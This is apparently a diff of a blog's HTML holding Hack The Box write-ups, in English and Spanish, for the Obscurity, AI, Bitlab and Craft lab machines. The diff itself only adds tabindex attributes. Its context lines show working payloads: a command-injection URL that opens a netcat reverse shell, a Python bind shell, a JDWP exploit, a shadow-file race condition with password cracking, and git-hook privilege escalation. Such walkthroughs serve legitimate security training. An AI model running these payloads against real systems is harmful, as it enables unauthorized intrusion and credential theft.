@@ -11,7 +11,7 @@ I have more machines to do a write-up of, for example some of them are Postman, 
 <p>Cutting the chit-chat let&rsquo;s go into the write up!</p>
 <h2 id="nmap">Nmap</h2>
 <p>We start with nmap to see which ports are there open:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# nmap -sC -sV -O  10.10.10.168 -o initial-nmap-obscurity.htb 
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# nmap -sC -sV -O  10.10.10.168 -o initial-nmap-obscurity.htb 
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-17 16:42 EST
 Nmap scan report for 10.10.10.168
 Host is up (0.084s latency).
@@ -158,7 +158,7 @@ There are some sections in the page talking about the service by obscurity and p
 <p>After trying to enumerate a few more stuff without any luck, I notice is a rabbit hole and just move on.
 I run gobuster against the server, but no luck, it didn&rsquo;t find any directory, common file, absolutely nothing under the server, the only ports we have are ssh and the http 8080, being ssh is almost not possible to be the foothold, and keeping in mind the name of the machine, I decide to move into fuzzing the server to see if I can find anything usefull that gobuster was not able to find. For this I decide to use <code>ffuf</code> (I don&rsquo;t like wfuzz, neither it&rsquo;s syntax and also I consider it to be slow compared to ffuf), <a href="https://github.com/ffuf/ffuf">you can get ffuf here</a>.</p>
 <p>Then I proceed to fuzze the server and I got some interesting results:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# ffuf -D -mc 200 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -o obscurity-ffuf.htb
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# ffuf -D -mc 200 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -o obscurity-ffuf.htb
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -358,14 +358,14 @@ MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt
 <p>Pst: The hyperlink against the doc of <code>exec</code> points to 2.0 because when I did this machine, python 2.x was still alive, and then I just went to read of exec on that version.</p>
 <h2 id="rce">RCE</h2>
 <p>Knowing that the webserver is vulnerable to a command injection, I started to do some trial/error in differents ways, after some time and a little POC I ended getting a reverse shell by executing:</p>
-<pre><code class="language-console" data-lang="console">http://10.10.10.168:8080/';os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f');'
+<pre tabindex="0"><code class="language-console" data-lang="console">http://10.10.10.168:8080/';os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f');'
 </code></pre>
     <img src="/images/htb/obscurity/1-rce.png"  class="center"  style="border-radius: 8px;"  />
 
 
 <h2 id="user">user</h2>
 <p>Once inside a reverse, I start doing some normal linux enumeration, after a few minutes I see there is a user called <code>robert</code> and I list the contents of it&rsquo;s home:</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ ls -la /home/robert
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ ls -la /home/robert
 total 60
 drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 .
 drwxr-xr-x 3 root   root   4096 Sep 24 22:09 ..
@@ -386,15 +386,15 @@ drwxrwxr-x 3 robert robert 4096 Oct  3 16:34 .local
 </code></pre><p>So, we need to compromise <code>robert</code> and in it&rsquo;s home lies the path&hellip;in the ls is possible to see some interesting files/directorys: <code>BetterSSH</code>, <code>SuperSecureCrypt.py</code>, <code>out.txt</code>, <code>check.txt</code> and <code>passwordreminder.txt</code>, we start by checking the content of everything:</p>
 <p>First, the directory BetterSSH looks interesting, but we can&rsquo;t see what&rsquo;s inside, so let&rsquo;s take note of this as might come handy later.</p>
 <p><code>check.txt</code> has an interesting message:</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat check.txt
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat check.txt
 Encrypting this file with your key should result in out.txt, make sure your key is correct! 
 </code></pre><p><code>out.txt</code> looks like a ciphered message&hellip;(and from the content of <code>check.txt</code> we know they are related)</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file out.txt
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file out.txt
 out.txt: UTF-8 Unicode text, with NEL line terminators
 www-data@obscure:/home/robert$ cat out.txt
 ¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
 </code></pre><p>Same with <code>passwordreminder.txt</code>:</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file passwordreminder.txt
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file passwordreminder.txt
 passwordreminder.txt: UTF-8 Unicode text, with no line terminators
 www-data@obscure:/home/robert$ cat passwordreminder.txt 
 ´ÑÈÌÉàÙÁÑé¯·¿k
@@ -487,7 +487,7 @@ print(banner)
             f<span style="color:#f92672">.</span>write(encrypted)
 </code></pre></div><p>By analyzing what the code does, one can see that it takes a file as input and a key and ciphers that file, is possible to observe as well we can provide a ciphered file and it&rsquo;s correspondant plain text file in decrypt mode as key, which will give back the key that was used&hellip;
 Then we proceed to execute the script with <code>out.txt</code> as input and <code>check.txt</code> as the key, saving the output (the key), under tmp as <code>foobar</code>:</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k &quot;$( cat check.txt )&quot; -o /tmp/foobar -d
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k &quot;$( cat check.txt )&quot; -o /tmp/foobar -d
 ################################
 #           BEGINNING          #
 #    SUPER SECURE ENCRYPTOR    #
@@ -503,7 +503,7 @@ www-data@obscure:/home/robert$ cat /tmp/foobar
 cat /tmp/foobar
 alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai
 </code></pre><p>Now, we are able to decipher <code>passwordreminder.txt</code> providing the key we got before, getting then the content of <code>passwordreminder.txt</code> and highly likely the password of the user itself:</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai' -o /tmp/pass -d
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai' -o /tmp/pass -d
 ################################
 #           BEGINNING          #
 #    SUPER SECURE ENCRYPTOR    #
@@ -518,7 +518,7 @@ www-data@obscure:/home/robert$ cat /tmp/pass
 cat /tmp/pass
 SecThruObsFTW
 </code></pre><p>Now we try to do <code>su - robert</code> with the retrived password, and we are <code>robert</code> :)</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat /tmp/pass
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat /tmp/pass
 cat /tmp/pass
 SecThruObsFTW
 www-data@obscure:/home/robert$ su - robert
@@ -528,7 +528,7 @@ Password: SecThruObsFTW
 robert@obscure:~$
 </code></pre><h2 id="root">root</h2>
 <p>From here on, is recommended to connect as robert via ssh with the password we got before as we will have a fully TTY. Once in, as we are <code>robert</code>, it&rsquo;s possible for us to see what&rsquo;s inside <code>BetterSSH</code>:</p>
-<pre><code class="language-console" data-lang="console">$ ls -la BetterSSH
+<pre tabindex="0"><code class="language-console" data-lang="console">$ ls -la BetterSSH
 total 12
 drwxr-xr-x 2 root   root   4096 Dec  2 09:47 .
 drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 ..
@@ -599,7 +599,7 @@ session <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;u
         print(<span style="color:#e6db74">&#39;Output: &#39;</span> <span style="color:#f92672">+</span> o<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>))
         print(<span style="color:#e6db74">&#39;Error: &#39;</span>  <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#66d9ef">if</span> len(e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> print(<span style="color:#e6db74">&#39;&#39;</span>)
 </code></pre></div><p>On top of this we see that we can run with sudo (tl;dr: as root user) the mentioned script:</p>
-<pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo -l
+<pre tabindex="0"><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo -l
 Matching Defaults entries for robert on obscure:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -607,12 +607,12 @@ User robert may run the following commands on obscure:
     (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 </code></pre><p>By analyzing the source code, we see that once you try to login with <code>BetterSSH</code>, there is a moment where <code>/etc/shadow</code> is open in read mode (posible due to execute <code>BetterSSH.py</code> with sudo!), and is written under <code>/tmp/SSH</code> on a file, later on the temporal <code>/etc/shadow</code> written in tmp will be deleted, this means here we have a race condition where at some moment if we try to read the contents of the temporal file generated we will be able to do it, said this, let&rsquo;s try it.</p>
 <p>On one terminal, we execute <code>BetterSSH.py</code> with sudo:</p>
-<pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+<pre tabindex="0"><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 Enter username: root
 Enter password: foo
 Incorrect pass
 </code></pre><p>And in another term, we execute a while true loop, that will be doing cat on the files under <code>/tmp/SSH</code>, and at some moment we confim the race condition we previously thought of as we have the content of <code>/etc/shadow</code> for the user root (remember the script is run with sudo):</p>
-<pre><code class="language-console" data-lang="console">robert@obscure:/tmp/SSH$ while true; do cat *; done
+<pre tabindex="0"><code class="language-console" data-lang="console">robert@obscure:/tmp/SSH$ while true; do cat *; done
 root
 $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
 18226
@@ -620,7 +620,7 @@ $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M5
 99999
 7
 </code></pre><p>I grab that content of shadow and the one of <code>/etc/passwd</code>, run unshadow to generate a file compatible to john and crack it:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# unshadow passwd.txt shadow.txt &gt; rootkey.txt
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# unshadow passwd.txt shadow.txt &gt; rootkey.txt
 root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# john --wordlist=/usr/share/wordlists/rockyou.txt rootkey.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
@@ -629,7 +629,7 @@ mercedes         (root)
 --- SNIP ---
 Session completed
 </code></pre><p>And there we have the password of root user; <code>mercedes</code> and we succesfully login as root with it :D</p>
-<pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ su - root
+<pre tabindex="0"><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ su - root
 Password:
 root@obscure:~# id
 uid=0(root) gid=0(root) groups=0(root)
@@ -647,7 +647,7 @@ Al momento que rompí esta máquina, aún estaba documentando solamente vía scr
 <p>Bue&hellip;hora de empezar a romper un poco!</p>
 <h2 id="nmap">Nmap</h2>
 <p>Como siempre, arrancar enumerando ejecutando Nmap:</p>
-<pre><code class="language-console" data-lang="console"># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
+<pre tabindex="0"><code class="language-console" data-lang="console"># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
 Nmap scan report for ai.htb (10.10.10.163)
 Host is up (0.019s latency).
 Not shown: 998 closed ports
@@ -709,7 +709,7 @@ Algo más de enumeración se lleva a cabo.</p>
 
 <h2 id="punto-de-entrada">Punto de entrada</h2>
 <p>Los pasos para tratar de armar una inyección sql, fueron los mismos que antes para un RCE, basados en lo que gobuster tiró de resultado contra AI, se puede ver que hay algunos .php, uno de ellos en particular suena interesante; <code>intelligence.php</code>.</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -746,7 +746,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 
 
 <p>Las queries conseguidas al final, son así:</p>
-<pre><code>User:
+<pre tabindex="0"><code>User:
 Open single quote union select, username from users Comment Database
 Password:
 Open single quote union select, password from users Comment Database
@@ -760,10 +760,10 @@ Open single quote union select, password from users Comment Database
 
 
 <p>Se intenta loguearse a ssh con esas credenciales:</p>
-<pre><code>user: alexa
+<pre tabindex="0"><code>user: alexa
 passwd: H,Sq9t6}a&lt;)?q93_
 </code></pre><p>Exito!!</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
 alexa@10.10.10.163's password: 
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)
 
@@ -794,7 +794,7 @@ alexa@AI:~$ wc -c user.txt
 33 user.txt
 </code></pre><h2 id="escalamiento-de-privilegios">Escalamiento de privilegios</h2>
 <p>Cuando se revisan que procesos/puertos ahí abiertos, se ve que está el 8080 abierto:</p>
-<pre><code class="language-console" data-lang="console">alexa@AI:~$ ss -punta
+<pre tabindex="0"><code class="language-console" data-lang="console">alexa@AI:~$ ss -punta
 Netid               State                    Recv-Q                Send-Q                                       Local Address:Port                                        Peer Address
 :Port                 
 udp                 UNCONN                   0                     0                                            127.0.0.53%lo:53                                               0.0.0.0
@@ -825,12 +825,12 @@ tcp                 TIME-WAIT                0                     0            
 
 
 <p>Y, sorpresa! Está corriendo como root y encima con <a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html">JDWP</a> habilitado..</p>
-<pre><code class="language-console" data-lang="console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
+<pre tabindex="0"><code class="language-console" data-lang="console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
 </code></pre><p>Con una búsqueda rápida en google, se encuentra este <a href="https://www.exploit-db.com/exploits/46501">exploit</a></p>
 <p>Entonces, para usar ese exploit se crea un <code>bind.sh</code> en <code>/tmp</code> con el siguiente código:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
 </code></pre></div><p>Osea, se va a levantar un bind shell escuchando en el puerto 2222, se ejecuta el script:</p>
-<pre><code class="language-console" data-lang="console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
+<pre tabindex="0"><code class="language-console" data-lang="console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
 [+] Targeting '127.0.0.1:8000'
 [+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
 [+] Found Runtime class: id=650
@@ -845,7 +845,7 @@ tcp                 TIME-WAIT                0                     0            
 [+] Runtime.exec() successful, retId=6f0
 [!] Command successfully executed
 </code></pre><p>Después de eso, si se trata iniciar una conexión contra el servidor con nc a la IP:puerto contra la que se corrió el exploit, se consigue un reverso con root:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
 ai.lnx.htb [10.10.10.163] 2222 (?) open
 bash: cannot set terminal process group (6086): Inappropriate ioctl for device
 bash: no job control in this shell
@@ -866,7 +866,7 @@ A pesar de todo, en el futuro actualizaré este post para reflejar el camino ví
 <p>Dicho eso, hora de ensuciarse las manos :D</p>
 <h2 id="nmap">Nmap</h2>
 <p>Comenzamos ejecutando nmap para obtener que puertos/servicios están expuestos:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
 Nmap scan report for bitlab.htb (10.10.10.114)
 Host is up (0.019s latency).
@@ -958,7 +958,7 @@ $branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672"
 
 <p>Ahora que sabemos efectivamente que la url mencionada arriba es la que precisamos usar.
 Ejecutamos nuestro listener para el reverse shell y lo ejecutamos, con esto tenemos ejecución de código remota:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
 Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
@@ -971,7 +971,7 @@ www-data@bitlab:/var/www$ pwd
 pwd
 /var/www
 </code></pre><p>Verificamos si tenemos permisos de sudo, y vemos lo siguiente:</p>
-<pre><code class="language-console" data-lang="console">www-data@bitlab:/var/www$ sudo -l
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@bitlab:/var/www$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on bitlab:
     env_reset, exempt_group=sudo, mail_badpass,
@@ -997,7 +997,7 @@ drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
 -rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    
 </code></pre><p>Hasta ahora, sabemos que los repositorios de git están en <code>/var/www/html</code> y que tenemos permitido ejecutar un git pull con permisos de sudo desde adentro de los repositorios, esto es lo que vamos a usar para aprovecharnos de los webhooks habilitados en gitlab (post-merge hook) y nuestra capacidad de ejecutar el git pull con permisos de root (<code>git pull</code> es como git fetch pero mergea de una por decirlo de un modo), para entender mejor como esas dos cosas funcionan nos vamos a la documentación de git para <a href="https://git-scm.com/docs/githooks#_post_merge">hooks: post merge</a> y la de <a href="https://git-scm.com/docs/git-pull">git pull</a>.</p>
 <p>Nuestro repositorio no nos permite editar archivos ahí, así que lo copiamos a un lugar donde podamos:</p>
-<pre><code class="language-console" data-lang="console">www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
 cp -r profile /tmp/profile
 www-data@bitlab:/tmp/profile$ ls -la
 ls -la
@@ -1013,14 +1013,14 @@ drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
 drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
 -rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
 </code></pre><p>Creamos un script que se llama <code>post-merge</code> adentro de <code>.git/hooks</code> para conseguir un shell como root y le damos permisos de ejcución:</p>
-<pre><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ cd .git/hooks
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ cd .git/hooks
 cd .git/hooks
 www-data@bitlab:/tmp/profile/.git/hooks$ echo 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
 &lt; 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
 www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
 chmod u+x post-merge
 </code></pre><p>Una vez que hicimos eso, subimos cualquier archivo (no importa cuál!) a gitlab y lo mergeamos, una vez que hacemos eso desde la ruta donde tenemos permisos, ejecutamos <code>sudo git pull</code> y con eso ahora somos root:</p>
-<pre><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ sudo git pull
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ sudo git pull
 sudo git pull
 remote: Enumerating objects: 4, done.
 remote: Counting objects: 100% (4/4), done.
@@ -1072,7 +1072,7 @@ Ok, as I said at the begining of the post, there are 2 paths to get this box:</p
 </code></pre></div><p>Y despué de guardarlos y hacerle merge, nos vamos a <code>http://10.10.10.114/profile/&lt;el nombre que le diste al script&gt;</code>, y deberíamos tener como resultado el array en pantalla con el usuario <code>clave</code> y una contraseñá:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">Array ( [<span style="color:#ae81ff">0</span>] =&gt; Array ( [<span style="color:#a6e22e">id</span>] =&gt; <span style="color:#ae81ff">1</span> [<span style="color:#a6e22e">username</span>] =&gt; <span style="color:#a6e22e">clave</span> [<span style="color:#a6e22e">password</span>] =&gt; <span style="color:#a6e22e">c3NoLXN0cjBuZy1wQHNz</span><span style="color:#f92672">==</span> ) )
 </code></pre></div><p>Antes de intentar romperla por fuerza bruta, probamos usarla así como está, y éxito! La contraseña era esa, no estaba encriptada!</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
 clave@10.10.10.114's password: 
 Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
 clave@bitlab:~$ id
@@ -1104,7 +1104,7 @@ Today was just retired Craft from Hack the box, this was a really fun box to do,
 <p>Said that, let&rsquo;s start with the real write up!</p>
 <h2 id="nmap">Nmap</h2>
 <p>We start running nmap to scan for open ports and services:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 17:21 EST
 Nmap scan report for 10.10.10.110
 Host is up (0.082s latency).
@@ -1205,7 +1205,7 @@ Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
 <h2 id="rce">RCE</h2>
 <p>Now with credentials, knowing we could take advantage of the <code>eval()</code> and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to <code>/api/brew/</code>.
 I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use <code>test.py</code> realized about it late). grabbing the token and using it to authenticate.</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 import requests
@@ -1224,8 +1224,8 @@ payload = {&quot;name&quot;:&quot;foo&quot;,&quot;brewer&quot;:&quot;foo&quot;, 
 payload = json.dumps(payload)
 attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)
 </code></pre><p>In one tab run nc listening on port 4444 with <code>nc -lvp 4444</code>, and run in other tab we run the script to get the reverse:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
-</code></pre><pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
+</code></pre><pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
 /bin/sh: can't access tty; job control turned off
@@ -1234,7 +1234,7 @@ root
 /opt/app # id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 </code></pre><p>There is something weird, we are already root? we check if there is the <code>root.txt</code> in it&rsquo;s home and not, is not:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # cd /root
+<pre tabindex="0"><code class="language-console" data-lang="console">/opt/app # cd /root
 /root # ls -la
 total 12
 drwx------    1 root     root          4096 Feb  9  2019 .
@@ -1242,7 +1242,7 @@ drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
 drwx------    1 root     root          4096 Feb  9  2019 .cache
 /root # 
 </code></pre><p>So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):</p>
-<pre><code class="language-console" data-lang="console">/opt/app # ls -la /
+<pre tabindex="0"><code class="language-console" data-lang="console">/opt/app # ls -la /
 total 64
 drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
 drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
@@ -1298,7 +1298,7 @@ lrwxrwxrwx    1 root     root            12 Jan 30  2019 cpio -&gt; /bin/busybox
 lrwxrwxrwx    1 root     root            12 Jan 30  2019 crontab -&gt; /bin/busybox
 lrwxrwxrwx    1 root     root            12 Jan 30  2019 cryptpw -&gt; /bin/busybox
 </code></pre><p>Inside the directory were we started <code>/opt/app</code> we see if there is something interesting:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # ls -la
+<pre tabindex="0"><code class="language-console" data-lang="console">/opt/app # ls -la
 total 32
